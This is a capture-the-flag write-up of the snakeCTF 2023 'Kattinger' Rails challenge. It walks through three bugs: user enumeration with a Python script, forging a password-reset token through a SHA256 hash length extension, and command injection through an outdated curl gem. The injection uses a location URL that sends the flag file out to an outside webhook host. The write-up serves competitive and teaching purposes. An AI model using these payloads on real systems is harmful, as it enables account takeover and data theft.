```
Fellow cat lovers, I made an app to share our favorites!

https://kattinger.snakectf.org/
```

### First look

The challenge is a web application designed to be a place where a *registered* user can share posts (referred in the database as `cats`).  

When we visit the url, we are redirect to login page (route `/login`) (Figure 1)

{{< image src="/img/snakeCTF2023/register.png" >}}
**Figure 1**: Login page

We can register a user through the route, `/register` (Figure 2)

{{< image src="/img/snakeCTF2023/login.png" >}}
**Figure 2**: Register page

After logging in to the site, we are redirected to the home page (route `/cats`). The home page contains some shared posts from the users. (Figure 3)

{{< image src="/img/snakeCTF2023/homepage.png" >}}
**Figure 3**: Homepage

A post is basically made up of two fields:
- **Description**: A string describing the post
- **Location**: A string that is interpreted as an URL

A new post can be added through via the `/cats/new` route. (Figure 4)

{{< image src="/img/snakeCTF2023/add_cat.png" >}}
**Figure 4**: Add new post

A post can be viewed by visiting the `cats/X` route and the `/preview?id=X` route where $X$ is the *ID* of the post. (Figure 5-6)

**Figure 5**: Show post

{{< image src="/img/snakeCTF2023/preview.png" >}}
**Figure 6**: Preview post image

A user can view his profile through the `/users/X` route, where $X$ is  user's *ID*, **assigned incrementally** by the web application. A user can display his password and his token. (Figure 7)

{{< image src="/img/snakeCTF2023/profile.png" >}}
**Figure 7**: Show user profile

The `token` field refers to the *reset_token* which can be obtained by the route `/reset` **as an unauthenticated user**. (Figure 8)

{{< image src="/img/snakeCTF2023/reset.png" >}}
**Figure 8**: Reset password page: get token

After submitting the password reset request, we are redirected to `/reset_token`. As depicted in Figure 9, this page allows us to reset the password, but requires the reset token. The first legit question is: how do we get the token? We know that the token is displayed on the user's profile page, but what if we have forgotten the password?

{{< image src="/img/snakeCTF2023/reset_submit.png" >}}
**Figure 9**: Reset password page: use token

There are other routes in the application, but the informations shown are enough to move quickly through the resolution steps.

### Deep dive

#### First part
From the downloaded files we know that the application is written in Ruby on Rails, the target/core code is in the `controllers` folder.

The first thing to note is in the `Dockerfile` file:

```Dockerfile
[...]
ENTRYPOINT ["./bin/rails","server", "-b", "0.0.0.0"]
```

Basically, the `-b` flag means that the application is running in *debug mode*, so we have an information leak that we can use to map each function in the code to the routes. (Figure 10)

{{< image src="/img/snakeCTF2023/information_leak.png" >}}
**Figure 10**: Debug page

Diving into the code, from file `admin_controller.rb`

```ruby
  def index
    raise ActionController::RoutingError, 'Unauthorized' unless is_admin?
    @FLAG = ENV['FLAG'] || 'snakeCTF{REDACTED}'
  end
end
```

and the file `src/app/view/admin/index.html.erb` we can see that the flag is printed **when an admin user** visits the route `/admin`

```ruby
<% content_for :content do %>
  <div class="row center">
      <h5><i>I see you love cats as well!</i></h5>
  </div>
    <div class="row center">
        <label for="flag" class="black-text">Flag</label>
        <p class="black-text" name="flag">
            <%= @FLAG %>
        </p>
    </div>
<% end %>
```

So, how does the the application know when we are admin? Let's have a look at `session_helper.rb`

```ruby
    def is_admin?
        return current_user().username == ENV['ADMIN_USER']
    end
```

Ok, this code looks strange. The check for admin privileges isn't performed via the database. So wehere does `ADMIN_USER` come from? It's an environment variable, so we can see this from `compose.yml`

```yaml
    environment:
      FLAG: "REDACTED"
      HOST: "kattinger-app"
      ADMIN_USER: "REDACTED"
      ADMIN_PASSWORD: "REDACTEDREDACTEDREDACTED"
      SECRET: "REDACTEDREDACTEDREDACTEDREDACTED"
```

No luck, I also checked the files `development.sqlite3` and `test.sqlite3`, but the username and the password were redacted there  :(

##### First vulnerability: Unauthorized user enumeration
Remember the Figure 7? As we can see from the code, the `show` function in `users_controller.rb` didn't have the required `current_user?` check. So we can enumerate all registered users.

I guessed that discovering the `ADMIN_USER` value was part of the challenge, so I first tried route `users/0` and route `users/1` by hand, but I didn't find the admin user, so I wrote a simple script to exploit this behaviour.

```python
import requests

cookies = {
    '_kattinger_session': 'REDACTED xd',
}

for i in range(2, 1000):
    response = requests.get(f'https://kattinger.snakectf.org/users/{i}', cookies=cookies)

    if response.text.split('admin">')[1].split('</p>')[0].strip() == 'true':
        print("done", i)
        break
```

This script outputs the value 76, so if we visit the route `/users/76` we can see that the username is `4dm1n_54`. Unfortunately, the password and secret token are redacted. (Figure 11)

{{< image src="/img/snakeCTF2023/admin_profile.png" >}}
**Figure 11**: Admin profile

Once we have the admin username, we can request the token from the reset page (Figure 8), but how can we exploit this?

##### Second vulnerability: Reset token vulnerable to hash length attack
The second vulnerability is tricky but easy to exploit. The vulnerability is contained in the `reset_submit` function into the `users_controller.rb` file.

```ruby
def reset_submit
[...]
      unless User.exists?(username: params[:user][:username].last(8))
        @message = 'User not found!'
        render :reset_submit, status: :unprocessable_entity
        return
      end

      unless check(params[:user][:username], params[:user][:reset_token])
        @message = 'Wrong reset token!'
        render :reset_submit, status: :unprocessable_entity
        return
      end

      @account = User.find_by(username: params[:user][:username].last(8))
      @message = "Sorry, we're still building the application. Your current password is: " + @account.password
      render :reset_submit, status: :gone
      nil
    end
  end
```

This function **takes only the last 8 characters of the username supplied by the user** and checks if there is an entry in the database, then calls the `check` function with our input.  Note that **the `check` function is called with the full username** (so not only the last 8 characters)! Let's have a look at the code for this function in `users_helper.rb`. Here the token is calculated by concatenating a secret with the user's username. 

```ruby
    def check(username, token)
        generator = Digest::SHA256::new
        generator << ENV['SECRET'] + username
        return generator.hexdigest() == token
    end
```

In the file `application.rb` we discover that this secret is long 32 characters.

```ruby
    if !ENV.has_key?('SECRET')
      ENV['SECRET'] = SecureRandom.hex(32)
    end
```

We don't know the value of the environment variable `SECRET`, but this code is certainly vulnerable to a hash length extension attack. 

Steps to exploit:
1. Create a user whose username is of length 8, e.g. `BBBBBBBB`
2. Request a reset token for the user `BBBBBBBB`
3. Get the valid token of `BBBBBBBB` from your profile
4. Forge a new valid token for using the [Hash Length Extension Attack](https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack)
5. Reset the `4dm1n_54` password using this vulnerability

The idea here is to exploit the fact that the `@account` variable in the `reset_submit` function will contain the admin user object, because the backend will retrieve the user from the database whose username matches only the last eight characters of our provided input, so `params[:user][:username].last(8) == 4dm1n_54`  but the backend will calculate the `check` function with our entire input, so if we provide something like `BBBBBBBBBBBBBBBBBB4dm1n_54` and the reset_token of that string, the check will pass. 

The tool used was [hash_extender](https://github.com/iagox86/hash_extender), with the following parameters:
- `-l`:  `ENV['SECRET']` len, we know it is 32 as shown above
- `-f`: Hash type
- `-d`: Actual data (username),
- `-a`: String to append
- `-s`: Valid token of actual data

```bash
$ ./hash_extender -l 32 -f sha256 -d 'BBBBBBBB' -a '4dm1n_54' -s '62996500bea420
ff71cbb71f0abfced7860811f77e3746718f43d96068c438b6'
Type: sha256
Secret length: 32
New signature: e7255bd05d5b820605cf47931e87e738639d9162259b727814da8cce5806440e
New string: 424242424242424280000000000000000000000000000000000000000000014034646d316e5f3534
```

So we can send the `New signature` as  `reset_token` and `New string` as `username`. (Figure 12).

**Figure 12**: Reset submit password reset

This will give us the admin password (Figure 13).

Let's get the flag :)

{{< image src="/img/snakeCTF2023/meme.jpg" >}}

As shown in Figure 14, visiting route `/admin` we got... ~~flag~~ trolled :/

**Figure 14**: Flag page


#### Second part
We didn't get the flag, but now we can reach the `process_image` function in the `cats_helper.rb` file.

```ruby
    def process_image(image_path)        
        p "Processing: " + image_path
        image_path = image_path.encode!("utf-8").scrub()
        
        if image_path.start_with?('http') || image_path.start_with?('https')
            curl = CURL.new({:cookies_disable => false})
            curl.debug=true
            p image_path
            curl.save!(image_path)
            filename = Timeout::timeout(3) do
            end
            p filename
        else
            filename = image_path
        end
        
        processed = ImageList.new(image_path)
        processed = processed.solarize(100)
        result = 'data://image;base64,' + Base64.strict_encode64(processed.to_blob())
        File.unlink(filename)
        return result
    end
```

This function is called when **an admin user requests the preview route of the post**. (Figure 6)

```ruby
  def preview
    cat_exists?
    @kitten = Cat.find(params[:id])
    @image_url = @kitten.location
    
    return unless is_admin?
    @processed_data = process_image(@image_url)
  end
```

##### Third vulnerability: Command injection due to lack of input sanitization
It turns out that the `curl` gem used in `Gemfile.lock` is [outdated and vulnerable to command injection due to lack of input sanitization. ](https://github.com/advisories/GHSA-hxx6-p24v-wg8c)

```
[...]
    curl (0.0.9)
[...]
```

So we can easily exploit this by creating a 'cat' (post) with the following location:  (Figure 15)

`https://webhook.site/6c872784-a208-4a97-816f-f8bda206acbe/$(base64 /flag)`

{{< image src="/img/snakeCTF2023/flag_post.png" >}}
**Figure 15**: Location exploit

Then, when we visit the preview, we trigger an error in the backend, but we got a request with the flag at the provided URL. (Figure 16)

{{< image src="/img/snakeCTF2023/webhook.png" >}}
**Figure 16**: Received flag request

After decoding the base64, we have the flag

> snakeCTF{I_th0ugh7_it_w4s_4_k1tten}
